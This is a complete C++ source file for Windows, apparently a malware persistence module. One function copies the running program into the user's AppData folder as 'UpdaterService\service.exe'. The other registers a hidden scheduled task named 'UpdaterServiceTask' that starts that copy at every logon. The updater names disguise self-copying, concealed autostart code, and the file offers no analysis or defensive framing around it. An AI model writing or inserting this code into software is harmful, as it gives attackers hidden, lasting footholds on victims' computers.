#include "persistence.h"
#include <Windows.h>
#include <shlobj.h>
#include <string>
#include <taskschd.h>
#include <comutil.h>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")

bool CopySelfToAppData(std::wstring& outDestPath) {
    wchar_t currentPath[MAX_PATH];
    if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) {
        return false;
    }

    wchar_t appDataPath[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
        return false;
    }

    wchar_t destDir[MAX_PATH];
    swprintf_s(destDir, MAX_PATH, L"%s\\UpdaterService", appDataPath);

    if (CreateDirectoryW(destDir, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        wchar_t destPath[MAX_PATH];
        swprintf_s(destPath, MAX_PATH, L"%s\\service.exe", destDir);
        if (CopyFileW(currentPath, destPath, FALSE)) {
            outDestPath = destPath;
            return true;
        }
    }

    return false;
}

bool RegisterLogonTask(const std::wstring& exePath) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        return false;
    }

    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hr)) {
        CoUninitialize();
        return false;
    }

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) {
        CoUninitialize();
        return false;
    }

    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        pService->Release();
        CoUninitialize();
        return false;
    }

    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) {
        pService->Release();
        CoUninitialize();
        return false;
    }

    pRootFolder->DeleteTask(_bstr_t(L"UpdaterServiceTask"), 0);

    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);

    pService->Release();

    if (FAILED(hr)) {
        pRootFolder->Release();
        CoUninitialize();
        return false;
    }

    ITaskSettings* pSettings = NULL;
    hr = pTask->get_Settings(&pSettings);
    if (FAILED(hr)) {
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return false;
    }

    pSettings->put_StartWhenAvailable(VARIANT_TRUE);
    pSettings->put_Hidden(VARIANT_TRUE);
    pSettings->Release();

    ITriggerCollection* pTriggerCollection = NULL;
    hr = pTask->get_Triggers(&pTriggerCollection);
    if (FAILED(hr)) {
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return false;
    }

    ITrigger* pTrigger = NULL;
    hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
    pTriggerCollection->Release();
    if (FAILED(hr)) {
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return false;
    }

    ILogonTrigger* pLogonTrigger = NULL;
    hr = pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
    pTrigger->Release();
    if (FAILED(hr)) {
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return false;
    }

    pLogonTrigger->put_Id(_bstr_t(L"LogonTrigger"));
    pLogonTrigger->Release();

    IActionCollection* pActionCollection = NULL;
    hr = pTask->get_Actions(&pActionCollection);
    if (FAILED(hr)) {
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return false;
    }

    IAction* pAction = NULL;
    hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
    pActionCollection->Release();
    if (FAILED(hr)) {
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return false;
    }

    IExecAction* pExecAction = NULL;
    hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
    pAction->Release();
    if (FAILED(hr)) {
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return false;
    }

    pExecAction->put_Path(_bstr_t(exePath.c_str()));
    pExecAction->Release();

    IRegisteredTask* pRegisteredTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(L"UpdaterServiceTask"),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(L""),
        _variant_t(L""),
        TASK_LOGON_NONE,
        _variant_t(L""),
        &pRegisteredTask);

    pRootFolder->Release();
    pTask->Release();

    if (FAILED(hr)) {
        CoUninitialize();
        return false;
    }

    pRegisteredTask->Release();
    CoUninitialize();
    return true;
}
